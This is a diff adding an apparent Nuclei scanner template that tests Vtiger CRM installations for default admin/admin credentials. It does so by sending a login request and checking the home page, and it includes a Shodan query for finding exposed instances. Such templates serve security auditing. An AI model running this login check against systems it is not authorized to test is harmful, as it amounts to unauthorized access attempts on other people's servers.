@@ -1,0 +1,44 @@
+id: vtigercrm-default-login
+
+info:
+  name: Vtiger CRM - Default Login
+  author: icarot
+  severity: high
+  description: |
+    Detected a Vtiger CRM instance that enabled default admin credentials.
+  reference:
+    - https://github.com/vtiger-crm/vtigercrm
+    - https://code.vtiger.com/vtiger/vtigercrm
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: html:"Powered by vtiger CRM"
+  tags: default-login,vtiger,vtiger_crm,vuln
+
+variables:
+  username: admin
+  password: admin
+
+http:
+  - raw:
+      - |
+        POST /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        module=Users&action=Authenticate&return_module=Users&return_action=Login&user_name={{username}}&user_password={{password}}
+
+      - |
+        GET /index.php?action=index&module=Home HTTP/1.1
+        Host: {{Hostname}}
+
+    host-redirects: true
+    max-redirects: 2
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(header_1, "PHPSESSID=")'
+          - 'contains_all(body_2, "home", "index.php?module=Emails&action=index")'
+        condition: and
+# digest: 490a00463044022003eed628cd4e8d821e4482edc4b3ebcfbdb21b13d57388ea7aca2bff48c0b37002206800fb0c90b4bd8dcf2a0dfe69ceb60846e63c2472539c6f3076c659a80dadbd:922c64590222798bb761d5b6d8e72950
